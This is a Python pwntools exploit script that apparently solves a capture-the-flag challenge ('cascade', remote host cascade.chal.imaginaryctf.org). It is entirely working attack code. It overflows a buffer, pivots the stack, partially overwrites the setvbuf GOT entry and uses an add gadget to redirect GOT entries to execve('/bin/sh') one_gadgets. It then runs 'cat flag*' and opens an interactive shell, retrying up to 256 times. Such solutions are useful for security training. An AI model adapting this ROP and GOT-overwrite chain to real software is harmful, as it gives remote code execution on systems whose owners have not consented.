from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]
f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
elf = ELF(vuln_path)
libc = elf.libc

# io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    sleep(1)


"""
0x000000000040113c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040113d : pop rbp ; ret

0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0xef4ce execve("/bin/sh", rbp-0x50, r12)
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])

"""

log.success("setvbuf :-----> " + hex(libc.symbols["setvbuf"])) #0x88550
log.success("read :-----> " + hex(libc.symbols["read"])) #0x11ba50

bss = 0x404020
vuln = 0x401162
callmain = 0x401074
pop_rbp = 0x40113d
add = 0x40113c
setvbuf = 0x404008
read_plt = elf.plt["read"]


def pwn(io):
    payload = b"b" * 0x40
    payload += p64(setvbuf + 0x40 + 0x40)
    payload += p64(vuln)
    io.sendline(payload)
    sleep(1)

    one_gadget = [0x583f3, 0x583ec, 0xef4ce, 0xef52b]
    delate = one_gadget[2] - 0x11ba50 + 0xffffffffffffffff + 1
    log.success("delate :-----> " + hex(delate))
    # payload = b"a" * 0x40
    payload = p64(0)
    payload += p64(pop_rbp)
    payload += p64(0x404100)
    payload += p64(vuln)
    payload = payload.ljust(0x40, b"1")

    payload += p64(setvbuf + 0x40)
    payload += p64(vuln)
    io.sendline(payload)
    sleep(1)

    # 0x88550 -> 0x886BB
    io.send(b"\xbb\x86")
    sleep(1)

    payload = b"c" * 0x40
    payload += p64(0x404000 + 0x3d) # pop_rbp, read_got + 0x3d
    payload += p64(elf.plt["setvbuf"])
    payload += p64(delate) # rbx=one_gadget - read
    payload += p64(0) * 5
    payload += p64(pop_rbp)
    payload += p64(0x404000 + 0x3d)
    payload += p64(add)
    """
    0x00000000000a877e : pop rcx ; ret
    0x000000000040113c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x000000000011094c : pop rcx ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
    
    """
    delate = 0x000000000011094c - 0x886bb

    payload += p64(elf.plt["setvbuf"])
    payload += p64(delate)
    payload += p64(0) * 5
    payload += p64(pop_rbp)
    payload += p64(0x404008 + 0x3d)
    payload += p64(add)

    payload += p64(elf.plt["setvbuf"])
    payload += p64(0) * 4
    payload += p64(pop_rbp)
    payload += p64(0x404800)
    payload += p64(vuln)
    # ddebug(io, "break *0x0401179 \n break *0x040115A\n continue")
    io.sendline(payload)
    sleep(1)
    io.sendline(b"cat flag*")
    data = io.recv(0x40)
    if b"{" in data:
        log.success(data)
        sleep(10000)

    io.interactive()


def getio():
    io = process([vuln_path]) if not f_remote else remote("cascade.chal.imaginaryctf.org", 1337)
    return io


for i in range(0x100):
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        log.success(str(e))
    finally:
        if io:
            io.close()
